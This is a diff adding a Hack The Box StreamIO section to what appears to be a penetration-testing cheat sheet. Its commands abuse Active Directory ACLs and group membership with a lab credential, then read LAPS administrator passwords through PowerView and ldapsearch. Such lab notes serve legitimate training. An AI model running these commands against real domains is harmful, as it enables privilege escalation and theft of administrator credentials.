@@ -184,3 +184,27 @@ certipy-ad auth -pfx administrator.pfx
 
 
 ```
+
+
+### From HTB StreamIO for "**ReadLAPSPassword**" "WriteOwner /Owns" privilege attack
+
+```
+
+While logged in as a user, but got creds for a user who can read LAPS Password:
+
+upload /usr/share/windows-binaries/PowerView.ps1
+
+Import-Module .\PowerView.ps1
+$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
+Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
+net user jdgodd /domain
+Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
+Get-DomainObject DC -Credential $cred -Properties "ms-Mcs-AdmPwd",name
+
+or just do this from kali:
+
+ldapsearch -x -b 'DC=streamIO,DC=htb' -H ldap://streamio.htb -D JDgodd@streamio.htb -W "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
+```
